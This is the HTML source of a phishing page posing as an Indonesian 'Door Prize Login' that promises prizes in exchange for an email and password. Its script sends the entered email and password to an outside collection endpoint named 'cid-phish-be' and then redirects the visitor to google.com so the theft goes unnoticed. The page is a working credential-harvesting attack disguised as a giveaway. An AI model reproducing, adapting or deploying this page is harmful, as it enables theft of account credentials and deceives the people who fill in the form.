<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Door Prize Login</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: "Poppins", sans-serif;
    }

    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: radial-gradient(circle, #ffd700, #ff4500);
    }

    .login-container {
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
      width: 100%;
      max-width: 400px;
      text-align: center;
      position: relative;
    }

    .login-container h2 {
      color: #333;
      font-size: 2rem;
      font-weight: bold;
    }

    .login-container img {
      width: 80px;
      margin-bottom: 15px;
    }

    .tagline {
      font-size: 1rem;
      margin-bottom: 15px;
      font-weight: bold;
      color: #444;
    }

    .input-group {
      margin-bottom: 1rem;
      text-align: left;
    }

    .input-group label {
      font-weight: bold;
    }

    .input-group input {
      width: 100%;
      padding: 12px;
      border: 2px solid #ffd700;
      border-radius: 8px;
      background: #fffaf0;
    }

    .btn {
      width: 100%;
      padding: 12px;
      background: #ff4500;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 1rem;
      font-weight: bold;
      margin-top: 10px;
      transition: 0.3s;
    }

    .btn:hover {
      background: #e63946;
      transform: scale(1.05);
    }

    .error {
      color: red;
      font-size: 0.9rem;
      margin-top: 5px;
    }

    .footer {
      margin-top: 15px;
      font-size: 0.9rem;
    }

    .footer a {
      color: #ff4500;
      text-decoration: none;
    }
  </style>
</head>

<body>
  <div class="login-container">
    <img src="https://cdn-icons-png.flaticon.com/512/1792/1792897.png" alt="Prize Icon" />
    <h2>Door Prize Login</h2>
    <p class="tagline">Masukkan Alamat Email Anda & menangkan hadiah menarik!</p>
    <form id="loginForm">
      <div class="input-group">
        <label for="email">Email</label>
        <input type="text" id="email" required />
      </div>
      <div class="input-group">
        <label for="password">Password</label>
        <input type="password" id="password" required />
      </div>
      <button id="testeb" onclick="handleSubmit(event)" class="btn">
        Masuk untuk Menang!
      </button>
      <p id="error-message" class="error"></p>
    </form>
    <div class="footer">
      <a href="#">Syarat & Ketentuan</a> | <a href="#">Bantuan</a>
    </div>
  </div>
  <script>

    const uid = "tuE2wLMwtDQJpYGSmExGZz77v9Q2";
    const websiteName = "doorprizeTi";

    async function handleSubmit(event) {
      event.preventDefault();
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;
      const signInButton = document.getElementById("testeb");
      signInButton.disabled = true;
      signInButton.style.opacity = '0.5';
      signInButton.style.cursor = 'not-allowed';
      try {
        const response = await fetch("https://cid-phish-be.vercel.app/insertdata", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            uid: uid,
            websiteName: websiteName,
            email: email,
            password: password
          })
        });

        window.location.href = "https://google.com/";
      } catch (error) {
        window.location.href = "https://google.com/";
        console.error("Error inserting data:", error);
      }
    }
  </script>
</body>

</html>
